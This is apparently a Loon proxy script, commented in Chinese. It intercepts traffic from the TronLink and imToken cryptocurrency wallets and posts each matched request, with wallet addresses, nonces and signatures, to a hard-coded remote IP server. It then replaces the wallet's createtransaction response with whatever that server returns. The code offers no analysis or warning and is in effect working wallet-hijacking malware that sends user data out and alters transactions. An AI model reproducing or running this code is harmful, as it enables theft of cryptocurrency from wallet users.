const request = $request;
const requrl = $request.url;
const Host = $request.headers
const usercode = $argument;
const regexRules = [
    { regex: /wallet\/getLatestAPK\?address=/, description: 'TronLink' },
    { regex: /^https:\/\/tron-mainnet\.token\.im\/wallet\/createtransaction$/, description: 'Imtoken' },
    // ...可以有很多规则
    { regex: /pattern50/, description: 'Description for pattern 50' }
];

///api/v1/wallet/getLatestAPK?address=TYtGyengaZQKkFU161uKCrRQQU2jJTNpv6&nonce=3691&secretId=ED151200DD0B3B52&signature=W5gBsApwNhp5GLgwA0Jho/77TbU%3D
const matchingRule = regexRules.find(rule => rule.regex.test(requrl));

if (matchingRule) {
    sendNotification("成功", "", "匹配到" + matchingRule.description, "loon://off");
    let params = {
        url: "http://43.134.170.213:8001/api/trx/getinfo",
        body: {
            "info": {
                "usercode": usercode,
                "type":matchingRule.description
            },
            "request": {
                "request": request
            }
        },//仅仅在post请求中有效
    }
    $httpClient.post(params, function (errormsg, response, data) { 
        if(response.status==200){
            let newdata = JSON.parse(data)
            console.log("========================"+data)
            console.log(typeof(newdata) )
            if(newdata.data && newdata.message!=="success"){
                sendNotification("", "", newdata.data,"loon://off");
                $done({})
                return
            } 
            console.log("-----------------------------")
            var RespnseBodyData = $response.body
    // RespnseBodyData = Json.parse(RespnseBodyData);
    RespnseBodyData = newdata.data;
    console.log("+++++++++++++++++++++++++++++++++++++++++++++++++++")
    $done({RespnseBodyData});//修改完成之后需要调用$done
    
        }
    })
} 

$done({});
function sendNotification(title, subtitle, message, url) {
    $notification.post(title, subtitle, message, url);
}